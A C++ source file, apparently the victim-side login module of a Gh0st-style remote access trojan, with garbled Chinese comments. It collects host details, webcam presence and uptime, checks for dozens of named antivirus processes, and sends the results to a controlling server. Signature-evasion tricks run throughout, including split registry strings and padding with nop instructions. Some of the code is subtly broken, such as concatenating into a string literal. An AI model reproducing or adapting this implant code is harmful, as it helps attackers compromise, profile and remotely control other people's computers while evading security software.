#include <wininet.h>
#include <stdlib.h>
#include <vfw.h>
#include <iphlpapi.h> //��������ͷ

#include "until.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "vfw32.lib")
#pragma comment ( lib, "iphlpapi.lib" ) 

DWORD CPUClockMhz()
{
	char str1[256]="~M";
	char str2[256]="Hz";
	strcat(str1,str2);

	char str3[256]="HARDWARE\\DESCRIPTION\\Sys";
	char str4[256]="tem\\CentralProcessor\\0";
	strcat(str3,str4);

	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;
	RegOpenKey(HKEY_LOCAL_MACHINE, str3, &hKey);
	RegQueryValueEx(hKey, str1, NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
	RegCloseKey(hKey);
	return	dwCPUMhz;
}
BOOL IsWebCam()
{
	BOOL	bRet = FALSE;
	
	char	lpszName[100], lpszVer[50];
	for (int i = 0; i < 10 && !bRet; i++)
	{
		bRet=capGetDriverDescription(i, lpszName, sizeof(lpszName),
			lpszVer, sizeof(lpszVer));
	}
	return bRet;
}


UINT GetHostRemark(LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[1024] = "SYSTEM\\Setup";
	memset(lpBuffer, 0, uSize);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Host", REG_SZ, (char *)lpBuffer, NULL, uSize, 0);

	if (lstrlen(lpBuffer) == 0)
		gethostname(lpBuffer, uSize);
	
	return lstrlen(lpBuffer);
}

///////////////////ɱ����ʾ
char* GetSVirus()
{	
   char* AllName = "";									
   char* SVirusName = "360tray.exe";
   char* SVirusName1 = "avp.exe";    
   char* SVirusName2 = "KvMonXP.exe";								
   char* SVirusName3 = "RavMonD.exe";	
   char* SVirusName4 = "360sd.exe"; 
   char* SVirusName5 = "Mcshield.exe"; 							
   char* SVirusName6 = "egui.exe"; 
   char* SVirusName7 = "kxetray.exe";  
   char* SVirusName8 = "knsdtray.exe";	  				
   char* SVirusName9 = "TMBMSRV.exe";  
   char* SVirusName10 = "avcenter.exe";   
   char* SVirusName11 = "AvastSvc.exe";
   char* SVirusName12 = "AYAgent.aye";  
   char* SVirusName13 = "patray.exe";    
   char* SVirusName14 = "V3Svc.exe";
   char* SVirusName15 = "avgwdsvc.exe"; 
   char* SVirusName16 = "ccSetMgr.exe";  
   char* SVirusName17 = "ashserv.exe";
   char* SVirusName18 = "QUHLPSVC.EXE"; 
   char* SVirusName19 = "mssecess.exe";  
   char* SVirusName20 = "SavProgress.exe";
   char* SVirusName21 = "fsavgui.exe";  
   char* SVirusName22 = "vsserv.exe";     
   char* SVirusName23 = "remupd.exe"; 
   char* SVirusName24 = "TmProxy.exe";  
   char* SVirusName25 = "FortiTray.exe";  
   char* SVirusName43 = "KSafeTray.EXE";
   char* SVirusName44 = "QQPCTray.exe";  
   char* SVirusName45 = "a2guard.exe";     
   char* SVirusName46 = "ad-watch.exe";
   char* SVirusName47 = "fsav32.exe"; 
   char* SVirusName48 = "cleaner8.exe";  
   char* SVirusName49 = "vba32lder.exe";
   char* SVirusName50 = "MongoosaGUI.exe";  
   char* SVirusName51 = "CorantiControlCenter32.exe";  
   char* SVirusName52 = "F-PROT.EXE";
   char* SVirusName53 = "CMCTrayIcon.exe";  
   char* SVirusName54 = "K7TSecurity.exe";  
   char* SVirusName55 = "UnThreat.exe";
   char* SVirusName56 = "CKSoftShiedAntivirus4.exe"; 
   char* SVirusName57 = "AVWatchService.exe"; 
   char* SVirusName58 = "ArcaTasksService.exe";
   char* SVirusName59 = "iptray.exe";  
   char* SVirusName60 = "PSafeSysTray.exe"; 
   char* SVirusName61 = "nspupsvc.exe";
   char* SVirusName62 = "SpywareTerminatorShield.exe";  
   char* SVirusName63 = "BKavService.exe"; 
   char* SVirusName64 = "MsMpEng.exe"; 
   char* SVirusName65 = "SBAMSvc.exe";  
   char* SVirusName66 = "ccSvcHst.exe"; 
   char* SVirusName67 = "cfp.exe";
   char* SVirusName68 = "S.exe";
   char* SVirusName69 = "1433.exe";
   char* SVirusName70 = "DUB.exe";
   char* SVirusName71 = "FTP.exe";

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		if (GetProcessID(SVirusName)) 
	{

//		OutputDebugString( "����360��ȫ��ʿ��" );
		ZeroMemory( SVirusName, sizeof(SVirusName) );
		SVirusName = "360��ȫ��ʿ";
	//	MessageBox( NULL, VirusName, "", NULL );
		lstrcat( AllName, SVirusName ); // ����ҵ��˽���, �Ͱ����ּӵ�AllName�ĺ���
		lstrcat( AllName, " " ); // ��һ�� ����, ��������б��ɱ��.
	}
	if (GetProcessID(SVirusName1))
	{	

		ZeroMemory( SVirusName1, sizeof(SVirusName1) );
		SVirusName1 = "����˹��";
		lstrcat( AllName, SVirusName1 ); 
		lstrcat( AllName, " " );
	}
	if (GetProcessID(SVirusName2))
	{	

		ZeroMemory( SVirusName2, sizeof(SVirusName2) );
		SVirusName2 = "����ɱ��";
		lstrcat( AllName, SVirusName2 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(SVirusName3))
	{	
		_asm nop;
		_asm nop;
		_asm nop;
		ZeroMemory( SVirusName3, sizeof(SVirusName3) );
		SVirusName3 = "����ɱ��";
		lstrcat( AllName, SVirusName3 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(SVirusName4))
	{	
		_asm nop;
		_asm nop;
		_asm nop;
		ZeroMemory( SVirusName4, sizeof(SVirusName4) );
		SVirusName4 = "360ɱ��";
		lstrcat( AllName, SVirusName4 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(SVirusName5))
	{	
		_asm nop;
		_asm nop;
		_asm nop;
		ZeroMemory( SVirusName5, sizeof(SVirusName5) );
		SVirusName5 = "�󿧷�";
		lstrcat( AllName, SVirusName5 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(SVirusName6))
	{	
		_asm nop;
		_asm nop;
		_asm nop;
		char UIs[] = {'N','O','D','3','2','\0'};
		ZeroMemory( SVirusName6, sizeof(SVirusName6) );
		SVirusName6 = UIs;
		lstrcat( AllName, SVirusName6 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(SVirusName7))
	{	
		_asm nop;
		_asm nop;
		_asm nop;
		ZeroMemory( SVirusName7, sizeof(SVirusName7) );
		SVirusName7 = "��ɽ����";
		lstrcat( AllName, SVirusName7 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(SVirusName8))
	{	
		_asm nop;
		_asm nop;
		_asm nop;
		ZeroMemory( SVirusName8, sizeof(SVirusName8) );
		SVirusName8 = "��ţɱ��";
		lstrcat( AllName, SVirusName8 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(SVirusName9))
	{	
		_asm nop;
		_asm nop;
		_asm nop;
		ZeroMemory( SVirusName9, sizeof(SVirusName9) );
		SVirusName9 = "���ƿƼ�";
		lstrcat( AllName, SVirusName9 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(SVirusName10))
	{	
		_asm nop;
		_asm nop;
		_asm nop;
		ZeroMemory( SVirusName10, sizeof(SVirusName10) );
		SVirusName10 = "С��ɡ";
		lstrcat( AllName, SVirusName10 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(SVirusName11))
	{	
		_asm nop;
		_asm nop;
		_asm nop;
		char QDdd[] = {'a','v','a','s','t','ɱ','��','\0'};
		ZeroMemory( SVirusName11, sizeof(SVirusName11) );
		SVirusName11 = QDdd;
		lstrcat( AllName, SVirusName11 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(SVirusName12))
	{	
		ZeroMemory( SVirusName12, sizeof(SVirusName12) );
		_asm nop;
		_asm nop;
		_asm nop;
		SVirusName12 = "��������";
		_asm nop;
		_asm nop;
		_asm nop;
		lstrcat( AllName, SVirusName12 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(SVirusName13))
	{	
		ZeroMemory( SVirusName13, sizeof(SVirusName13) );
		_asm nop;
		_asm nop;
		_asm nop;
		SVirusName13 = "����ʿ";
		_asm nop;
		_asm nop;
		_asm nop;
		lstrcat( AllName, SVirusName13 );
		lstrcat( AllName, " " );
	}
 	if (GetProcessID(SVirusName14))
	{	
		_asm nop;
		_asm nop;
		_asm nop;
		ZeroMemory( SVirusName14, sizeof(SVirusName14) );
		SVirusName14 = "����ʿV3";
		lstrcat( AllName, SVirusName14 );
		lstrcat( AllName, " " );
	}
  	if (GetProcessID(SVirusName15))
	{	
		_asm nop;
		_asm nop;
		_asm nop;
		ZeroMemory( SVirusName15, sizeof(SVirusName15) );
		SVirusName15 = "AVGɱ��";
		lstrcat( AllName, SVirusName15 );
		lstrcat( AllName, " " );
	}
  	if (GetProcessID(SVirusName16))
	{	
		_asm nop;
		_asm nop;
		_asm nop;
		ZeroMemory( SVirusName16, sizeof(SVirusName16) );
		SVirusName16 = "��������";
		lstrcat( AllName, SVirusName16 );
		lstrcat( AllName, " " );
	}
  	if (GetProcessID(SVirusName17))
	{	
		_asm nop;
		_asm nop;
		_asm nop;
		ZeroMemory( SVirusName17, sizeof(SVirusName17) );
		SVirusName17 = "Avast������";
		lstrcat( AllName, SVirusName17 );
		lstrcat( AllName, " " );
	}
  	if (GetProcessID(SVirusName18))
	{	
		_asm nop;
		_asm nop;
		_asm nop;
		ZeroMemory( SVirusName18, sizeof(SVirusName18) );
		SVirusName18 = "QUICK HEALɱ��";
		lstrcat( AllName, SVirusName18 );
		lstrcat( AllName, " " );
	}
        if (GetProcessID(SVirusName19))
	{	
			_asm nop;
			_asm nop;
		_asm nop;
		ZeroMemory( SVirusName19, sizeof(SVirusName19) );
		SVirusName19 = "΢��ɱ��";
		lstrcat( AllName, SVirusName19 );
		lstrcat( AllName, " " );
	}
        if (GetProcessID(SVirusName20))
	{	
			_asm nop;
			_asm nop;
		_asm nop;
		ZeroMemory( SVirusName20, sizeof(SVirusName20) );
		SVirusName20 = "Sophosɱ��";
		lstrcat( AllName, SVirusName20 );
		lstrcat( AllName, " " );
	}
        if (GetProcessID(SVirusName21))
	{	
			_asm nop;
			_asm nop;
		_asm nop;
		char tsfy[] = {'F','-','S','e','c','u','r','e','ɱ','��','\0'};
		ZeroMemory( SVirusName21, sizeof(SVirusName21) );
		SVirusName21 = tsfy;
		lstrcat( AllName, SVirusName21 );
		lstrcat( AllName, " " );
	}
        if (GetProcessID(SVirusName22))
	{	
			_asm nop;
			_asm nop;
		_asm nop;
		ZeroMemory( SVirusName22, sizeof(SVirusName22) );
		SVirusName22 = "�������";
		lstrcat( AllName, SVirusName22 );
		lstrcat( AllName, " " );
	}
        if (GetProcessID(SVirusName23))
	{	
			_asm nop;
			_asm nop;
		_asm nop;
		ZeroMemory( SVirusName23, sizeof(SVirusName23) );
		SVirusName23 = "��è��ʿ";
		lstrcat( AllName, SVirusName23 );
		lstrcat( AllName, " " );
	}
        if (GetProcessID(SVirusName24))
	{	
			_asm nop;
			_asm nop;
		_asm nop;
		ZeroMemory( SVirusName24, sizeof(SVirusName24) );
		SVirusName24 = "���ƿƼ�";
		lstrcat( AllName, SVirusName24 );
		lstrcat( AllName, " " );
	}
        if (GetProcessID(SVirusName25))
	{	
			_asm nop;
			_asm nop;
		_asm nop;
		ZeroMemory( SVirusName25, sizeof(SVirusName25) );
		SVirusName25 = "����";
		lstrcat( AllName, SVirusName25 );
		lstrcat( AllName, " " );
	}
	
	if (GetProcessID(SVirusName43))
	{	
		ZeroMemory( SVirusName43, sizeof(SVirusName43) );
		SVirusName43 = "��ɽ��ʿ";
		lstrcat( AllName, SVirusName43 );
		lstrcat( AllName, " " );
	}
	
	if (GetProcessID(SVirusName44))
	{	
		ZeroMemory( SVirusName44, sizeof(SVirusName44) );
		SVirusName44 = "QQ���Թܼ�";
		lstrcat( AllName, SVirusName44 );
		lstrcat( AllName, " " );
	}
	
	if (GetProcessID(SVirusName45))
	{	
		ZeroMemory( SVirusName45, sizeof(SVirusName45) );
		SVirusName45 = "a-squaredɱ��";
		lstrcat( AllName, SVirusName45 );
		lstrcat( AllName, " " );
	}
	
	if (GetProcessID(SVirusName46))
	{	
		ZeroMemory( SVirusName46, sizeof(SVirusName46) );
		SVirusName46 = "Lavasoftɱ��";
		lstrcat( AllName, SVirusName46 );
		lstrcat( AllName, " " );
	}
	
	if (GetProcessID(SVirusName47))
	{	
		char tfy[] = {'F','-','S','e','c','u','r','e','ɱ','��','\0'};
		ZeroMemory( SVirusName47, sizeof(SVirusName47) );
		SVirusName47 = tfy;
		lstrcat( AllName, SVirusName47 );
		lstrcat( AllName, " " );
	}
	
	if (GetProcessID(SVirusName48))
	{	
		ZeroMemory( SVirusName48, sizeof(SVirusName48) );
		SVirusName48 = "The Cleanerɱ��";
		lstrcat( AllName, SVirusName48 );
		lstrcat( AllName, " " );
	}
	
	if (GetProcessID(SVirusName49))
	{	
		ZeroMemory( SVirusName49, sizeof(SVirusName49) );
		SVirusName49 = "vb32ɱ��";
		lstrcat( AllName, SVirusName49 );
		lstrcat( AllName, " " );
	}
	
	if (GetProcessID(SVirusName50))
	{	
		ZeroMemory( SVirusName50, sizeof(SVirusName50) );
		SVirusName50 = "Mongoosaɱ��";
		lstrcat( AllName, SVirusName50 );
		lstrcat( AllName, " " );
	}
	
	if (GetProcessID(SVirusName51))
	{	
		ZeroMemory( SVirusName51, sizeof(SVirusName51) );
		SVirusName51 = "Coranti2012ɱ��";
		lstrcat( AllName, SVirusName51 );
		lstrcat( AllName, " " );
	}
	
	if (GetProcessID(SVirusName52))
	{	
		ZeroMemory( SVirusName52, sizeof(SVirusName52) );
		SVirusName52 = "F-PROTɱ��";
		lstrcat( AllName, SVirusName52 );
		lstrcat( AllName, " " );
	}

	if(GetProcessID(SVirusName53))
	{	
		ZeroMemory( SVirusName53, sizeof(SVirusName53) );
		SVirusName53 = "CMCɱ��";
		lstrcat( AllName, SVirusName53 );
		lstrcat( AllName, " " );
	}
	
	if(GetProcessID(SVirusName54))
	{	
		ZeroMemory( SVirusName54, sizeof(SVirusName54) );
		SVirusName54 = "K7ɱ��";
		lstrcat( AllName, SVirusName54 );
		lstrcat( AllName, " " );
	}
	
	if(GetProcessID(SVirusName55))
	{	
		ZeroMemory( SVirusName55, sizeof(SVirusName55) );
		SVirusName55 = "UnThreatɱ��";
		lstrcat( AllName, SVirusName55 );
		lstrcat( AllName, " " );
	}
	
	if(GetProcessID(SVirusName56))
	{	
		ZeroMemory( SVirusName56, sizeof(SVirusName56) );
		SVirusName56 = "Shield Antivirusɱ��";
		lstrcat( AllName, SVirusName56 );
		lstrcat( AllName, " " );
	}
	
	if(GetProcessID(SVirusName57))
	{	
		ZeroMemory( SVirusName57, sizeof(SVirusName57) );
		SVirusName57 = "VIRUSfighterɱ��";
		lstrcat( AllName, SVirusName57 );
		lstrcat( AllName, " " );
	}
	
	if(GetProcessID(SVirusName58))
	{	
		ZeroMemory( SVirusName58, sizeof(SVirusName58) );
		SVirusName58 = "ArcaVirɱ��";
		lstrcat( AllName, SVirusName58 );
		lstrcat( AllName, " " );
	}
	
	if(GetProcessID(SVirusName59))
	{	
		ZeroMemory( SVirusName59, sizeof(SVirusName59) );
		SVirusName59 = "Immunetɱ��";
		lstrcat( AllName, SVirusName59 );
		lstrcat( AllName, " " );
	}
	
	if(GetProcessID(SVirusName60))
	{	
		ZeroMemory( SVirusName60, sizeof(SVirusName60) );
		SVirusName60 = "PSafeɱ��";
		lstrcat( AllName, SVirusName60 );
		lstrcat( AllName, " " );
	}
	
	if(GetProcessID(SVirusName61))
	{	
		ZeroMemory( SVirusName61, sizeof(SVirusName61) );
		SVirusName61 = "nProtectɱ��";
		lstrcat( AllName, SVirusName61 );
		lstrcat( AllName, " " );
	}
	
	if(GetProcessID(SVirusName62))
	{	
		ZeroMemory( SVirusName62, sizeof(SVirusName62) );
		SVirusName62 = "SpywareTerminatorɱ��";
		lstrcat( AllName, SVirusName62 );
		lstrcat( AllName, " " );
	}
	
	if(GetProcessID(SVirusName63))
	{	
		ZeroMemory( SVirusName63, sizeof(SVirusName63) );
		SVirusName63 = "Bkavɱ��";
		lstrcat( AllName, SVirusName63 );
		lstrcat( AllName, " " );
	}

	if (GetProcessID(SVirusName64))
	{	
		ZeroMemory( SVirusName64, sizeof(SVirusName64) );
		SVirusName64 = "Microsoft Security Essentials";
		lstrcat( AllName, SVirusName64 );
		lstrcat( AllName, " " );
	}

	if (GetProcessID(SVirusName65))
	{	
		ZeroMemory( SVirusName65, sizeof(SVirusName65) );
		SVirusName65 = "VIPRE";
		lstrcat( AllName, SVirusName65 );
		lstrcat( AllName, " " );
	}
	
	if (GetProcessID(SVirusName66))
	{	
		ZeroMemory( SVirusName66, sizeof(SVirusName66) );
		SVirusName66 = "Nortonɱ��";
		lstrcat( AllName, SVirusName66 );
		lstrcat( AllName, " " );
	}

    if (GetProcessID(SVirusName67))
	{	
		ZeroMemory( SVirusName67, sizeof(SVirusName67) );
		SVirusName67 = "COMODO";
		lstrcat( AllName, SVirusName67 );
		lstrcat( AllName, " " );
	}
	
	    if (GetProcessID(SVirusName68))
	{	
		ZeroMemory( SVirusName68, sizeof(SVirusName68) );
		SVirusName67 = "��ץ��";
		lstrcat( AllName, SVirusName68 );
		lstrcat( AllName, " " );
	}

		    if (GetProcessID(SVirusName69))
	{	
		ZeroMemory( SVirusName69, sizeof(SVirusName69) );
		SVirusName69 = "��ɨ1433";
		lstrcat( AllName, SVirusName69 );
		lstrcat( AllName, " " );
	}
			    if (GetProcessID(SVirusName70))
	{	
		ZeroMemory( SVirusName70, sizeof(SVirusName70) );
		SVirusName70 = "�ڱ���";
		lstrcat( AllName, SVirusName70 );
		lstrcat( AllName, " " );
	}
			    if (GetProcessID(SVirusName71))
	{	
		ZeroMemory( SVirusName71, sizeof(SVirusName71) );
		SVirusName71 = "����FTP";
		lstrcat( AllName, SVirusName71 );
		lstrcat( AllName, " " );
	}

	if (strstr(AllName, " " )  == 0 )
	{	
		lstrcat(AllName , "��δ����");

	}

	return AllName;
}

char*  GetInfo(LPCTSTR lpKeyName, LPCTSTR lpServiceName)
{
	char	strValue[1024]={0};
	char	strSubKey[1024];
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
	
	if(!ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, lpKeyName, REG_SZ, (char *)strValue, NULL, 1024, 0))
		return "";
	return	strValue;
}

extern MODIFY_DATA modify_data;

UINT GetGroupName(LPTSTR lpBuffer, UINT uSize)
{	
	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));
	
	//wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
	wsprintf(strSubKey,"%s%s%s%s", "SYST", "EM\\CurrentContro", "lSet\\Services\\", "BITS");
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, modify_data.szGetGroup , REG_SZ, (char *)lpBuffer, NULL, uSize, 0);
	
	return lstrlen(lpBuffer);
}

int GetNetwork()//��ȡ��������Mbps 
{
	DWORD dwSize = 0;
	DWORD dwRetVal = 0;
	DWORD speed = 0; 
    DWORD dwspeed = 0;
	MIB_IFTABLE *pIfTable;
	MIB_IFROW *pIfRow;
	
	pIfTable = (MIB_IFTABLE *) malloc(sizeof (MIB_IFTABLE));
	if (pIfTable == NULL) 
	{
		return 1;
	}
	dwSize = sizeof (MIB_IFTABLE);
	if (GetIfTable(pIfTable, &dwSize, FALSE) == ERROR_INSUFFICIENT_BUFFER) 
	{
		free( pIfTable);
		pIfTable = (MIB_IFTABLE *) malloc(dwSize);
		if (pIfTable == NULL) 
		{
			return 1;
		}
	}
	if ((dwRetVal = GetIfTable(pIfTable, &dwSize, FALSE)) == NO_ERROR) 
	{        
		pIfRow = (MIB_IFROW *) & pIfTable->table[0];
		speed = pIfRow->dwSpeed;
		dwspeed = speed/1000/1000; //mbps        
	} 
	if (pIfTable != NULL) 
	{
		free(pIfTable);
		pIfTable = NULL;
	}
	
	return dwspeed;
}

int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed)
{
	int nRet = SOCKET_ERROR;
	// ��¼��Ϣ
	LOGININFO	LoginInfo;
	// ��ʼ��������
	LoginInfo.bToken = TOKEN_LOGIN; // ����Ϊ��¼
	LoginInfo.bIsWebCam = 0; //û������ͷ
	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // ע��ת������

	// ������
	char hostname[256];
	GetHostRemark(hostname, sizeof(hostname));

	// ���ӵ�IP��ַ
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);


	memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));
	memcpy(&LoginInfo.HostName, hostname, sizeof(LoginInfo.HostName));
	// CPU
	LoginInfo.dwCPUClockMhz = CPUClockMhz();
	SYSTEM_INFO SysInfo;//���ڻ�ȡCPU������
	GetSystemInfo(&SysInfo);
	LoginInfo.nCPUNumber = SysInfo.dwNumberOfProcessors;
	
	//�ڴ��С
    MEMORYSTATUS    MemInfo; 
    MemInfo.dwLength=sizeof(MemInfo); 
    GlobalMemoryStatus(&MemInfo);
	LoginInfo.MemSize = MemInfo.dwTotalPhys/1024/1024;

	//����ͷ
	LoginInfo.bIsWebCam = IsWebCam();

	// Speed
	LoginInfo.Speed = dwSpeed;

	// Speed
	LoginInfo.dwSpeed = GetNetwork();

    // ɱ�����
	strcpy( LoginInfo.SVirus, GetSVirus() );

	//����ʱ��
	long t=GetTickCount();
	char day[100];
	char hour[100];
	char min[100];
	wsprintf(day, "%d", t/86400000);
	t%=86400000;
	wsprintf(hour, "%d", t/3600000);
	t%=3600000;
	wsprintf(min, "%d", t/60000);
    wsprintf(LoginInfo.RunTime, "%s��%sСʱ%s����", day, hour, min);

	//���߰汾
	strcpy(LoginInfo.szVersion, MyDecode(modify_data.szVersion));

	// ���߷���
	char	*UpRow = NULL;
	char Group[256];
	char strWirn2[] = {'D','e','f','a','u','l','t','\0'};
	if(GetGroupName(Group, sizeof(Group))==0)
	{
		if(modify_data.szGroup != NULL)
		{
			UpRow = (char *)(MyDecode(modify_data.szGroup));
		}
		else
		{
			UpRow = strWirn2;
		}
	}
	else
	{
		UpRow=Group;
	}
	strcpy(LoginInfo.UpGroup,UpRow);

	nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));

	return nRet;
}
